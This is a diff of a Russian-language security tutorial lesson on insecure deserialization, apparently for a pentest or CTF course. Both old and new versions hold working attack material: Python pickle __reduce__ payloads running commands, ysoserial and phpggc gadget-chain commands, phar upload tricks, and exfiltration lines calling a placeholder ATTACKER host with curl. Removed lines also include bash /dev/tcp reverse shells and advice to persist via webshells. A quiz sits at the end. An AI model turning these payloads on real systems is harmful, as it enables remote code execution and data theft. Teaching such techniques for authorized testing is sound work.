@@ -14,45 +14,33 @@ estimated_minutes: 45
 summary: "Как распознать небезопасную десериализацию в PHP/Java/Python/Node и построить gadget-цепочку до RCE."
 ---
 
-Небезопасная десериализация — это восстановление объекта из данных, контролируемых атакующим, что приводит к исполнению кода через «магические» методы (PHP `__wakeup`, Java `readObject`, Python `__reduce__`). Это один из самых «глубоких» классов: чтобы проэксплуатировать, нужно построить **gadget chain** — цепочку классов из доступных библиотек, которая при десериализации приводит к выполнению команды. Зато результат — почти всегда RCE.
+## Вопрос, с которого всё начинается
 
-## Теория: как работает и как распознать
+Приложению нужно сохранить между запросами не просто строку, а целый объект — например, корзину с товарами. Тогда программисты «замораживают» объект в байты (это **сериализация**) и отдают его клиенту, а на следующем запросе «размораживают» обратно (**десериализация**).
 
-Сериализация превращает объект в байты; десериализация восстанавливает. Опасность в том, что при восстановлении объект может выполнять код (через магические методы/хуки).
+Вопрос: что, если клиент пришлёт **свой** набор байтов? При восстановлении объекта язык может автоматически вызвать специальные методы — и если в них есть опасная логика, твои данные превращаются в выполнение кода. Сегодня разберём это на одном примере — cookie, который выглядит как закодированный объект.
 
-**PHP:** функции `serialize()`/`unserialize()`. Формат: `O:4:"User":2:{s:4:"name";s:3:"bob";s:4:"role";s:4:"user";}`. Магические методы `__wakeup`, `__destruct`, `__toString` выполняются при десериализации/уничтожении и используются в gadget-цепочках (популярные: `Monolog`, `Guzzle`, `Laravel`).
+## Наш пример
 
-**Java:** `ObjectInputStream.readObject()`. Сериализованный поток начинается с `AC ED 00 05`. Эксплуатация через `ysoserial` (готовые цепочки: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1`, `Hibernate1`).
-
-**Python:** `pickle.loads()`. Поток начинается с `\x80` (protocol 2+) и содержит opcodes. Эксплуатация — переопределение `__reduce__`, возвращающего `(os.system, ('cmd',))`.
-
-**Node:** `node-serialize` с `_$$ND_FUNC$$_function(){...}()` — IIFE выполняется при десериализации.
-
-**.NET:** `BinaryFormatter`, `LosFormatter`, `ViewState` — через `ysoserial.net`.
-
-Как распознать:
-- **Cookie/параметр в base64**, декодируется в бинарный мусор или `O:...`/`a:...` (PHP), `rO0AB...` (Java base64 от `AC ED 00 05`), `\x80\x04` (pickle).
-- Скрытые поля/токены, которые выглядят как сериализованный blob.
-- Ошибки «unserialize()», «ObjectInputStream», «pickle», `__VIEWSTATE`.
-
-## Инструменты: ysoserial, phpggc, pickle-скрипты
-
-**PHP — phpggc** (готовые цепочки):
+Есть дашборд `dashboard.example`. При входе он выдаёт cookie:
 
 ```bash
-phpggc -l                                    # список цепочек
-phpggc Laravel/RCE9 system id                 # сгенерировать payload
-phpggc -b Monolog/RCE1 system 'id' | base64   # base64 для cookie
+$ curl -si https://dashboard.example/login -d 'user=bob&pass=...' | grep -i set-cookie
+Set-Cookie: session=gASVJgAAAAAAAACM...
 ```
 
-**Java — ysoserial:**
+Значение `session` — длинная строка в base64. Что внутри? Декодируем:
 
 ```bash
-java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
-java -jar ysoserial.jar CommonsBeanutils1 'curl http://ATTACKER/`id`' | base64 -w0
+$ echo 'gASVJgAAAAAAAACM...' | base64 -d | xxd | head -2
+00000000: 8004 9528 0000 0000 0000 8c0a 5f5f 6d61  ...(..........__ma
 ```
 
-**Python — ручной pickle:**
+Первые байты `80 04` — сигнатура Python **pickle** (формата сериализации Python). Дальше видно `__ma...` — начало имени модуля. Мы поняли: сервер отдаёт клиенту pickle-объект и, значит, при следующем запросе его десериализует. Ключевой вопрос — **доверяет ли он этому объекту?**
+
+## Шаг 1: что такое pickle и его «магический» метод
+
+`pickle` — встроенный модуль Python. При десериализации (`pickle.loads`) он восстанавливает объект, а для этого вызывает у класса метод `__reduce__`. Этот метод может вернуть **вызываемый объект и аргументы** — то есть буквально «что выполнить». Классический трюк: вернуть `os.system` и строку команды.
 
 ```python
 import pickle, os, base64
@@ -61,271 +49,170 @@ class Exploit:
     def __reduce__(self):
         return (os.system, ('id',))
 
-payload = base64.b64encode(pickle.dumps(Exploit()))
-print(payload.decode())
-```
-
-**Detect-сигнатуры:**
-
-```
-PHP:    O:<len>:"<Class>":<n>:{...}   или  a:<n>:{...}
-Java:   rO0AB (base64 от AC ED 00 05)
-Python: gASV (base64) / \x80\x04
-Node:   {"rce":"_$$ND_FUNC$$_function(){...}()"}
-.NET:   /wEPDwUK...  (ViewState)
-```
-
-## Разобранный пример: pickle-cookie → RCE
-
-Цель — `https://dashboard.example`, cookie `session` выглядит как base64.
-
-Шаг 1. Декодируем cookie:
-
-```bash
-echo 'gASVJgAAAAAAAACM...' | base64 -d | xxd | head
-# 80 04 95 ... -> Python pickle (protocol 4)
-```
-
-Шаг 2. Готовим payload. Сначала безопасный PoC — `id`:
-
-```python
-import pickle, os, base64
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('id > /tmp/pwned',))
-
 print(base64.b64encode(pickle.dumps(Exploit())).decode())
 ```
 
-Шаг 3. Подставляем в cookie и шлём запрос:
+Когда сервер вызовет `pickle.loads` на этом blob'е, Python выполнит `os.system('id')`. Это и есть небезопасная десериализация.
 
-```bash
-PAYLOAD=$(python3 gen.py)
-curl -s "https://dashboard.example/" -b "session=$PAYLOAD"
-```
+## Шаг 2: сначала безопасный детектор
 
-Шаг 4. Проверяем выполнение — через out-of-band (если вывода нет):
+Не стоит сразу стрелять командой. Сначала проверим, что канал вообще существует и что наш blob десериализуется. Поднимем свой HTTP-сервер и попросим сервер обратиться к нам:
 
 ```python
-# payload: curl на наш сервер
 class Exploit:
     def __reduce__(self):
         return (os.system, ('curl http://ATTACKER:8080/$(id|base64)',))
-```
 
-На нашем сервере:
+# → base64-строка payload
+```
 
 ```bash
-python3 -m http.server 8080
-# в логе: GET /dWlkPTAocm9vdCk...
+$ python3 -m http.server 8080 &          # наш listener
+$ PAYLOAD=$(python3 gen.py)
+$ curl -s https://dashboard.example/ -b "session=$PAYLOAD"
+# в логе http-сервера:
+# 203.0.113.9 - - "GET /dWlkPTAocm9vdCkK HTTP/1.1" 404 -
 ```
 
-Шаг 5. Для reverse shell — тот же подход с `os.system`:
+Пришёл запрос с base64 от `id=0(root)` — команда выполнена на сервере. Артефакт есть, и мы подтвердили его через OOB, даже не видя ответа в браузере.
 
-```python
-return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
-```
+## Шаг 3: почему нельзя просто взять любой blob
 
-## Java-пример (кратко)
+Ключевое слово — **gadget chain** («цепочка гаджетов»): набор классов из библиотек, которые уже есть в приложении и которые при десериализации приводят к выполнению команды. В Python это легко (сам `pickle` умеет вызывать объекты), а в Java и PHP сложнее — там цепочку строят из готовых классов фреймворка.
 
-```
-1. Заметить cookie/параметр с base64, начинающимся на rO0AB.
-2. Сгенерировать: java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0
-3. Подставить в запрос: curl -H 'Cookie: session=<payload>' https://target/
-4. Если не сработало — перебрать цепочки (CC1..CC7, Spring, Hibernate).
-```
+Именно поэтому одна и та же техника работает по-разному:
 
-Для blind-детекта используйте URLDNS-цепочку (инициирует DNS-запрос — видно на коллабораторе):
+| Язык | Сигнатура | Инструмент | Как строится |
+|------|-----------|-----------|--------------|
+| PHP | `O:<n>:"Class":...`, `a:<n>:{...}` | `phpggc` | готовые цепочки (Monolog, Laravel) |
+| Java | `AC ED 00 05` (base64 `rO0AB`) | `ysoserial` | CommonsCollections, Spring… |
+| Python | `\x80\x04` (base64 `gASV`) | ручной `pickle` | `__reduce__` |
+| Node | `_$$ND_FUNC$$_function(){...}()` | `node-serialize` | IIFE |
+| .NET | `AAEAAAD`, `/wEPDwUK` | `ysoserial.net` | BinaryFormatter/ViewState |
+
+Быстрая проверка типа — одной командой:
 
 ```bash
-java -jar ysoserial.jar URLDNS 'http://unique.ATTACKER' | base64 -w0
+$ echo "$BLOB" | base64 -d 2>/dev/null | xxd | head -1
+# ac ed 00 05 -> Java ; 80 04 -> pickle ; 4f 3a -> PHP "O:"
 ```
 
-## Типичные ошибки новичков
+## Шаг 4: Java — сначала URLDNS, потом цепочки
 
-- **Не распознать формат.** `O:`, `rO0AB`, `\x80` — сигнатуры; учитесь их узнавать. Без этого вы не поймёте, что перед вами десериализация.
-- **Путать сериализацию данных и десериализацию кода.** Не каждый blob уязвим — нужен именно вызов десериализации пользовательских данных.
-- **Сразу стрелять RCE-payload.** Начните с DNS/безвредного PoC (URLDNS, `curl` на коллаборатор), чтобы убедиться в канале.
-- **Не учитывать версию/набор библиотек.** Gadget-цепочка зависит от того, какие классы есть в classpath; перебирайте цепочки.
-- **Игнорировать подписанные/шифрованные blob.** Если blob подписан (HMAC) или зашифрован — сначала нужен ключ/секрет (часто утекает в JS/конфиге).
-- **Забыть про PHP phar.** Даже `file_exists()` на `phar://` может триггерить десериализацию метаданных.
-- **Ломать приложение некорректным payload.** Неверный blob вызывает 500; проверяйте синтаксис сериализации.
-
-## Полный разбор: PHP unserialize → POP-цепочка (с выводом)
-
-End-to-end от обнаружения до RCE через готовую gadget-цепочку.
-
-Шаг 1. Обнаруживаем сериализованный blob. Например, cookie `data`:
+В Java объект восстанавливает `ObjectInputStream.readObject()`. Blob начинается с `AC ED 00 05` (в base64 — `rO0AB`). Сначала используем **безопасный** детектор `URLDNS`: он лишь заставляет JVM сделать DNS-запрос, который видно на коллабораторе:
 
 ```bash
-echo 'TzoyNToiTW9ub2xvZ1xIYW5kbGVyXFN0cmVhbUhhbmRsZXIiOjE6...' | base64 -d 2>/dev/null | head -c 60
-# O:25:"Monolog\Handler\StreamHandler":1:{...}   -> PHP-сериализация
+$ java -jar ysoserial.jar URLDNS 'http://unique.ATTACKER' | base64 -w0
 ```
 
-Шаг 2. Определяем фреймворк/библиотеки (по исходникам/`.env`/`composer.json`):
+Пришёл DNS — десериализация есть. Только теперь перебираем RCE-цепочки по библиотекам в classpath:
 
 ```bash
-curl -s https://app.example/.git/HEAD   # или .env / composer.json
-# Monolog присутствует -> цепочки Monolog/RCE*
-phpggc -l | grep -i monolog
-# Monolog/RCE1 ... Monolog/RCE9
+$ for c in CommonsCollections1 CommonsCollections5 CommonsBeanutils1 Spring1; do
+>   java -jar ysoserial.jar $c 'curl http://ATTACKER/'$c 2>/dev/null | base64 -w0 > /tmp/p_$c
+>   echo "try $c"
+> done
 ```
 
-Шаг 3. Генерируем payload (команда без вывода — для blind):
+Цепочки `CommonsCollections1..7`, `CommonsBeanutils1`, `Spring1`, `Hibernate1`, `Groovy1` — выбор зависит от того, какие библиотеки загружены. На новых JDK и при включённом `ObjectInputFilter` часть цепочек блокируется — перебирай.
+
+## Шаг 5: PHP и неочевидный триггер phar
+
+В PHP сериализация — это `serialize()`/`unserialize()`, формат `O:4:"User":2:{...}`. Готовые цепочки даёт `phpggc`:
 
 ```bash
-phpggc Monolog/RCE1 system 'curl http://ATTACKER:8080/$(id|base64)' | base64 -w0 > payload.txt
-cat payload.txt
+$ phpggc -l | grep -i monolog
+$ phpggc Monolog/RCE1 system 'curl http://ATTACKER:8080/$(id|base64)' | base64 -w0
 ```
 
-Шаг 4. Отправляем и слушаем коллаборатор:
+Отдельная тонкость: в PHP десериализация срабатывает **не только** при явном `unserialize()`. Метаданные **phar**-архива десериализуются при обращении к `phar://` через обычные файловые функции — `file_exists`, `getimagesize`, `fopen`:
 
 ```bash
-python3 -m http.server 8080 &   # наш сервер
-curl -s "https://app.example/" -b "data=$(cat payload.txt)"
-# в логе: GET /dWlkPTAocm9vdCkK   -> id выполнен
+$ phpggc -p phar -o exploit.phar Monolog/RCE1 system id
+$ curl -s "https://app.example/avatar?src=phar://uploads/exploit.phar/x"
 ```
 
-Шаг 5. Для интерактивности — reverse shell:
+phar можно замаскировать под картинку (`GIF89a` в начале, расширение `.jpg`) — важен контент, а не имя. Так связка «загрузка файла + любое чтение по пути» становится RCE.
 
-```bash
-phpggc Monolog/RCE1 system 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' | base64 -w0
-```
+## Шаг 6: как распознать десериализацию в дикой природе
 
-Шаг 6. Обязательный read-back: подтвердите выполнение (в логе коллаборатора / в шелле `id`). Не помечайте как «RCE» без подтверждения.
+Признаки, на которые смотришь:
 
-## Reference-таблица: сигнатуры и инструменты по языкам
+- **cookie или параметр в base64**, который декодируется в бинарный мусор или в `O:...`/`a:...` (PHP), `rO0AB` (Java), `\x80` (pickle);
+- скрытые поля/токены, похожие на сериализованный blob;
+- ошибки `unserialize()`, `ObjectInputStream`, `pickle`, поле `__VIEWSTATE` (ASP.NET).
 
-| Язык | Сигнатура | Инструмент | Формат payload |
-|------|-----------|-----------|----------------|
-| PHP | `O:<n>:"Class":...`, `a:<n>:{...}` | `phpggc` | serialize/phar |
-| Java | `AC ED 00 05` / base64 `rO0AB` | `ysoserial` | ObjectInputStream |
-| Python | `\x80\x02..\x05` / base64 `gASV` | ручной `pickle` | `__reduce__` |
-| Node | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` | `node-serialize` | IIFE |
-| .NET | `/wEPDwUK...` (ViewState), `AAEAAAD` | `ysoserial.net` | BinaryFormatter/LosFormatter |
-| Ruby | `\x04\x08` (Marshal) | ручной/`universal_gadget` | `Marshal.load` |
+Если blob **подписан** (HMAC) или зашифрован — сначала нужен ключ; он часто утекает в JS-файлах или конфигах.
 
-Быстрая проверка типа blob'а:
+## Что мы теперь знаем
 
-```bash
-echo "$BLOB" | base64 -d 2>/dev/null | xxd | head -1
-# ac ed 00 05 -> Java ; 80 04 -> pickle ; 4f 3a -> PHP O:...
-```
+- Десериализация восстанавливает объект из твоих данных; при этом вызываются «магические» методы (`__reduce__`, `__wakeup`, `readObject`).
+- Сигнатуры: PHP `O:`/`a:`, Java `AC ED 00 05`/`rO0AB`, Python `\x80`/`gASV`.
+- RCE строится через **gadget chain** — цепочку классов из библиотек приложения.
+- Инструменты: `phpggc` (PHP), `ysoserial` (Java), `ysoserial.net` (.NET), ручной `pickle` (Python).
+- Сначала — безопасный детектор (URLDNS, OOB `curl`), потом RCE.
+- В PHP phar-триггер срабатывает даже без явного `unserialize`.
+- Артефакт — вывод команды или OOB-запрос, а не «ошибка 500».
 
-## Java: выбор цепочки и blind-детект
+## На что смотреть дальше
 
-- **Сначала URLDNS** (безопасный): `java -jar ysoserial.jar URLDNS 'http://unique.ATTACKER' | base64 -w0` — инициирует DNS, видно на коллабораторе. Если DNS пришёл — десериализация есть.
-- **Затем цепочки по библиотекам:** `CommonsCollections1..7`, `CommonsBeanutils1`, `Spring1/2`, `Hibernate1/2`, `Groovy1`, `JRMPClient`. Выбор зависит от classpath.
-- **Blind RCE:** используйте `curl`/DNS-эксфильтрацию в команде.
-- **Фильтры:** если `readObject` обёрнут в фильтр (`ObjectInputFilter`), многие цепочки блокируются — ищите обходные (например, через `java.util.PriorityQueue`-based).
-- **Версии JDK:** некоторые цепочки требуют конкретных JDK; перебирайте.
-
-```bash
-for c in CommonsCollections1 CommonsCollections5 CommonsBeanutils1 Spring1; do
-  java -jar ysoserial.jar $c 'curl http://ATTACKER/'$c 2>/dev/null | base64 -w0 > /tmp/p_$c
-  echo "try $c"
-done
-```
-
-## Что делать дальше / решение
-
-1. **Распознать формат** blob'а (сигнатуры/`xxd`).
-2. **Определить стек** (фреймворк, библиотеки) — из исходников/конфигов.
-3. **Сгенерировать PoC** (`phpggc`/`ysoserial`/pickle) под этот стек.
-4. **Blind-детект** (URLDNS/OOB `curl`) перед RCE.
-5. **Подтвердить RCE** через коллаборатор/шелл и **сделать read-back** (`id`).
-6. **Закрепиться** (webshell/reverse shell) и записать артефакт.
-7. **Учесть подпись/шифрование** blob'а — искать ключ (`.env`, JS).
-
-## PHP phar и другие неочевидные триггеры
-
-Сериализация в PHP срабатывает не только при `unserialize()`. **phar-метаданные** десериализуются при обращении к `phar://` через **обычные файловые функции**:
-
-```php
-file_exists('phar://uploads/exploit.phar/x');
-getimagesize('phar://uploads/exploit.phar/x');
-is_file(...); stat(...); fopen(...); file_get_contents(...);
-```
-
-Поэтому цепочка «загрузка файла + любая файловая функция с управляемым путём» даёт RCE без явного `unserialize`:
-
-```bash
-./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
-curl -s "https://app.example/avatar?src=phar://uploads/exploit.phar/x"
-```
-
-phar маскируется под картинку (stub `GIF89a`, расширение `.jpg`) — расширение неважно, важен контент.
-
-Другие триггеры PHP-десериализации:
-
-- **Session deserialization:** PHP хранит сессии в формате serialize; если вы контролируете файл сессии (LFI + запись), можно подсунуть объект.
-- **`__PHP_Incomplete_Class`:** при отсутствии класса — маркер, что объект десериализован.
-- **Cookie/скрытые поля:** многие фреймворки (Laravel, Symfony) кладут сериализованные данные в cookie (`laravel_session`, `_symfony_flashes`).
-- **`igbinary`/`msgpack`:** альтернативные форматы — сигнатуры иные (`\x00`-префиксы).
-
-Проверяйте не только явные параметры, но и **любое** место, где приложение читает файл по пути, который вы контролируете — там может жить phar-триггер.
-
-## Инструменты и порядок для десериализации
-
-- **`phpggc -l`** — список PHP-цепочек (Monolog, Guzzle, Laravel, Symfony, Doctrine).
-- **`ysoserial.jar`** — Java-цепочки (CC1-7, Beanutils, Spring, Hibernate, Groovy).
-- **`ysoserial.net`** — .NET (BinaryFormatter, ViewState, LosFormatter, ObjectStateFormatter).
-- **`pickle`/`dill`** — Python (`__reduce__`).
-- **`node-serialize`/`serialize-javascript`** — Node.
-
-Порядок: распознать сигнатуру → определить стек → сгенерировать PoC → blind-детект (URLDNS/OOB) → RCE → read-back. Всегда начинайте с безопасного детектора, чтобы не уронить сервис некорректным blob'ом.
-
-## Замечание по безопасности payload'ов
-
-Готовые цепочки из `ysoserial`/`phpggc` — это реальный код исполнения. На живом стенде проверяйте сначала **безвредный** детектор (URLDNS/OOB `curl`), затем RCE. Никогда не запускайте payload, который модифицирует данные или открывает слушатель на цели без согласования — приложение должно остаться живым для дальнейшего пивота.
+- **Не путай формат данных и десериализацию кода.** Не каждый blob уязвим — нужен именно вызов десериализации твоих данных.
+- **Начинай с безвредного PoC** (URLDNS/OOB), чтобы не уронить сервис некорректным blob'ом.
+- **Учитывай версию и набор библиотек** — цепочка зависит от classpath; перебирай варианты.
+- **Подписанный/шифрованный blob** — сначала ищи ключ (`.env`, JS, конфиг).
+- **Обязательный read-back.** Подтверди выполнение по OOB-логу или `id` в шелле, прежде чем писать «RCE».
+- **Только с согласия.** Готовые цепочки — реальное выполнение кода; цель должна остаться живой.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Проверь себя.
 
 ```quiz
-- question: "Какая сигнатура указывает на сериализованный Java-объект?"
+- question: "Первые байты `80 04` в декодированном cookie означают:"
   options:
-    - "`O:4:"User"`"
-    - "`AC ED 00 05` (base64 `rO0AB`)"
-    - "`\x80\x04`"
-    - "`a:2:{`"
+    - "Java-сериализацию"
+    - "Python pickle"
+    - "PHP serialize"
+    - "PNG-картинку"
   answer: 1
-  explanation: "Это Java-магия ObjectInputStream."
-- question: "Какой метод Python-pickle используется для RCE?"
+  explanation: "`\\x80\\x04` — сигнатура pickle protocol 4."
+- question: "Какой метод Python-pickle используется для выполнения кода?"
   options:
     - "`__init__`"
     - "`__reduce__`"
     - "`__str__`"
     - "`__len__`"
   answer: 1
-  explanation: "Он возвращает вызываемый объект и аргументы."
-- question: "Для чего нужен ysoserial?"
+  explanation: "`__reduce__` возвращает вызываемый объект и аргументы."
+- question: "Для чего в ysoserial цепочка URLDNS?"
   options:
-    - "Для сканирования портов"
-    - "Для генерации Java-deserialization gadget-цепочек"
-    - "Для SQLi"
-    - "Для XSS"
+    - "Для выполнения команды"
+    - "Для безопасного blind-детекта: инициирует DNS-запрос"
+    - "Для чтения файла"
+    - "Для шифрования"
   answer: 1
-  explanation: "Готовые цепочки под разные библиотеки."
-- question: "Что делает цепочка URLDNS в ysoserial?"
-  options:
-    - "Выполняет команду"
-    - "Инициирует DNS-запрос для blind-детекта десериализации"
-    - "Читает файл"
-    - "Шифрует трафик"
-  answer: 1
-  explanation: "Безопасный детектор — видно на коллабораторе."
+  explanation: "DNS-запрос видно на коллабораторе, код не выполняется."
 - question: "Как выглядит PHP-сериализованный массив?"
   options:
     - "`[1,2]`"
     - "`a:2:{i:0;i:1;i:1;i:2;}`"
-    - "`{"a":1}`"
+    - '`{"a":1}`'
     - "`<array>`"
   answer: 1
   explanation: "Формат `a:<n>:{...}`."
+- question: "Чем опасен phar в PHP?"
+  options:
+    - "Он большой"
+    - "Метаданные десериализуются при обращении к `phar://` через обычные файловые функции"
+    - "Он шифрует файлы"
+    - "Он блокирует запросы"
+  answer: 1
+  explanation: "RCE срабатывает без явного `unserialize()` — через `file_exists`/`getimagesize`."
 ```
+
+## Куда дальше
+
+Дальше мы разберём десериализацию конкретно в **Python** (`web-python-deser`) — тот самый формат, что мы видели в cookie, — и покажем, как из `__reduce__` собирать стабильные payload'ы. А пока главное запомни: если сервер **восстанавливает объект из твоих байтов**, он может выполнить твой код.
 
 ## Где пригодится
 
